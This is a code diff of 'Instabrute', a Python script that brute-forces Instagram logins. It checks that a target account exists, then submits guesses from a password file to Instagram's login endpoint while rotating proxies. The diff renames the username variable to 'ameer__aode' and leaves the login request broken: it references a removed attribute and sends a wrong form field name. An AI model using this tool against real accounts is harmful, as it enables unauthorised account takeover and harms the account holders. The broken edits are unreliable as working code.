@@ -24,15 +24,15 @@ def Input(text):
 
 #The main class
 class Instabrute():
-	def __init__(self, username, passwordsFile='pass.txt'):
-		self.username = username
+	def __init__(self, ameer__aode, passwordsFile='pass.txt'):
+		self.ameer__aode = ameer__aode
 		self.CurrentProxy = ''
 		self.UsedProxys = []
 		self.passwordsFile = passwordsFile
 		
 		#Check if passwords file exists
 		self.loadPasswords()
-		#Check if username exists
+		#Check if ameer__aode exists
 		self.IsUserExists()
 
 
@@ -75,11 +75,11 @@ class Instabrute():
 		print('')
 
 
-	#Check if username exists in instagram server
+	#Check if ameer__aode exists in instagram server
 	def IsUserExists(self):
-		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
+		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.ameer__aode) 
 		if (r.status_code == 404):
-			print ('[*] User named "%s" not found' % username)
+			print ('[*] User named "%s" not found' % ameer__aode)
 			Input('[*] Press enter to exit')
 			exit()
 		elif (r.status_code == 200):
@@ -114,7 +114,7 @@ class Instabrute():
 		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 
 		#Update token after login to the site 
-		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
+		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'ameer__aode':self.username, 'password':password}, allow_redirects=True)
 		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 		
 		#parse response
